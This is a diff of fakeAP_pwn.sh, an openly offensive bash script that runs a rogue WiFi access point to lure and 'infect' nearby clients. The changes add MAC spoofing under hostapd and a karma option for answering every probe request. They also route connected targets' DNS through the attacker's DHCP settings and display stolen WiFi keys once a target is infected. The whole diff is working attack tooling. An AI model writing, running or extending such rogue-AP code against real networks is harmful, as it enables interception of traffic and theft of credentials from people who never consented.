@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#78 2010-07-31)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#79 2010-08-01)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -51,7 +51,7 @@ www=/var/www/fakeAP_pwn
 # If your having "timing out" problems, change this.
 mtu=1500
 
-# [true/false] Respond to every WiFi probe request? true = yes, false = no
+# [true/false] Respond to every WiFi probe request? true = yes, false = no (only for airbase-ng, we can use karma patches for hostapd)
 respond2All=false
 
 # [random/set/false] Change the FakeAP MAC Address?
@@ -70,7 +70,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="127.0.0.1" # 10.0.0.1?
      port=$(shuf -i 2000-65000 -n 1)
-  version="0.3 (Beta-#78)"
+  version="0.3 (Beta-#79)"
       www="${www%/}"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
@@ -448,10 +448,10 @@ if [ "$debug" == "" ] && [ "$debug" != "true" ] && [ "$debug" != "false" ] ; the
 if [ "$diagnostics" == "" ] && [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "debug isn't correct" $diagnostics 1>&2; cleanup; fi
 if [ "$verbose" == "" ] && [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose isn't correct" $diagnostics 1>&2; cleanup; fi
 
-if [ ! -e "$www/index.php" ] ; then
+if [ "www" == "/var/www/fakeAP_pwn" ] && [ ! -e "$www/index.php" ] ; then
    if [ -d "$www/" ] ; then
       mkdir -p $www
-      action "Copying www/" "cp -rf www/* $www/" $verbose $diagnostics "true" $debug # Stopping wicd to prevent channel hopping
+      action "Copying www/" "cp -rf www/* $www/" $verbose $diagnostics "true" $debug 
    fi
    if [ ! -e "$www/index.php" ] ; then
       display error "Missing index.php. Did you run: cp -rf www/* $www/" $diagnostics 1>&2
@@ -624,6 +624,10 @@ if [ "$apMode" != "non" ] ; then
       command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
       if [ -z "$command" ] ; then
          display error "IP Problem. Haven't got an IP address on $interface." $diagnostics 1>&2
+         pidcheck=`ps aux | grep $interface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
+         if [ -n "$pidcheck" ] ; then
+            kill $pidcheck # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
+         fi
          display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
          apMode="non"
       else
@@ -717,6 +721,22 @@ if [ "$apType" == "airbase-ng" ] ; then
    if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
       macAddress=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
       macAddressType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
+      display info "     macAddress=$macAddressType" $diagnostics
+   fi
+fi
+
+if [ "$apType" == "hostapd" ] ; then
+   if [ "$fakeAPmac" == "random" ] || [ "$fakeAPmac" == "set" ] ; then
+      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Changing MAC address..." $diagnostics ; fi
+      command="ifconfig $wifiInterface down &&"
+      if [ "$fakeAPmac" == "random" ] ; then  command="$command macchanger -A $wifiInterface"; fi
+      if [ "$fakeAPmac" == "set" ] ; then  command="$command macchanger -m $macAddress $wifiInterface"; fi
+      action "Changing MAC Address of FakeAP" "$command && ifconfig $wifiInterface up" $verbose $diagnostics "true" $debug
+      sleep 2
+   fi
+   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
+      macAddress=$(macchanger --show $wifiInterface | awk -F " " '{print $3}')
+      macAddressType=$(macchanger --show $wifiInterface | awk -F "Current MAC: " '{print $2}')
       display info "     macAddress=$macAddressType" $diagnostics
    fi
 fi
@@ -1003,13 +1023,9 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option routers 10.0.0.1;
   option subnet-mask 255.255.255.0;
   option broadcast-address 10.0.0.255;
-  option domain-name \"Home.com\";" > /tmp/fakeAP_pwn.dhcp
-if [ "$apMode" == "transparent" ] || [ "$apMode" == "normal" ] ; then
-    echo "  option domain-name-servers $gatewayIP;" >> /tmp/fakeAP_pwn.dhcp
-elif [ "$apMode" == "non" ] ; then
-    echo "  option domain-name-servers 10.0.0.1;" >> /tmp/fakeAP_pwn.dhcp
-fi
-echo "  option netbios-name-servers 10.0.0.100;
+  option domain-name \"Home.com\";
+  option domain-name-servers 10.0.0.1;
+  option netbios-name-servers 10.0.0.100; 
 }" >> /tmp/fakeAP_pwn.dhcp
 if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
 if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi
@@ -1142,7 +1158,7 @@ own_ip_addr=127.0.0.1
 #wmm_ac_vo_cwmax=3
 #wmm_ac_vo_txop_limit=47
 #wmm_ac_vo_acm=0
-#enable_karma=1
+#enable_karma=1 # uncomment this line if you patched hostapd with karma 
 #accept_mac_file=/etc/hostapd/hostapd.accept
 #deny_mac_file=/etc/hostapd/hostapd.deny" > /tmp/fakeAP_pwn.hostapd
    if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.hostapd"; fi
@@ -1364,7 +1380,7 @@ fi
 #----------------------------------------------------------------------------------------------#
    display info "Target infected!" $diagnostics
    if [ "$diagnostics" == "true" ] ; then echo "-Target infected!------------------------" >> fakeAP_pwn.log; fi
-   targetIP=$(arp -n -v -i at0 | awk '/at0/' | awk -F " " '{print $1}')
+   targetIP=$(arp -n -v -i $apInterface | grep $apInterface | awk -F " " '{print $1}')
    if [ "$verbose" != "0" ] ; then display info "Target's IP = $targetIP" $diagnostics ; fi; if [ "$diagnostics" == "true" ] ; then echo "Target's IP = $targetIP" >> fakeAP_pwn.log; fi
 
 #----------------------------------------------------------------------------------------------#
@@ -1388,16 +1404,15 @@ fi
 #----------------------------------------------------------------------------------------------#
    if [ "$payload" == "wkv" ] ; then
       display action "Opening WiFi Keys..." $diagnostics
-      action "WiFi Keys" "cat /tmp/fakeAP_pwn.wkv" "false" "false" "false" "true" 10 440 22 & # Don't close! We want to view this!
+      xterm -hold -geometry 130x22+10+440 -T "fakeAP_pwn v$version - WiFi Keys" -e "cat /tmp/fakeAP_pwn.wkv" & # Don't close! We want to view this!
       sleep 1
    fi
 #----------------------------------------------------------------------------------------------#
-elif [ "$apMode" == "normal" ] ; then
-   if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
+   if [ "$apMode" == "normal" ] ; then
+      if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
       action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "true" $debug 10 475 5 & # Dont wait, do the next command
+      fi
    fi
-fi
-
 #----------------------------------------------------------------------------------------------#
 if [ "$extras" == "true" ] ; then
    display action "Caputuring infomation about the target..." $diagnostics
@@ -1433,5 +1448,5 @@ if [ "$apMode" == "normal" ] ; then
 fi
 
 #----------------------------------------------------------------------------------------------#
-if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> fakeAP_pwn.log fi
+if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> fakeAP_pwn.log; fi
 cleanup clean
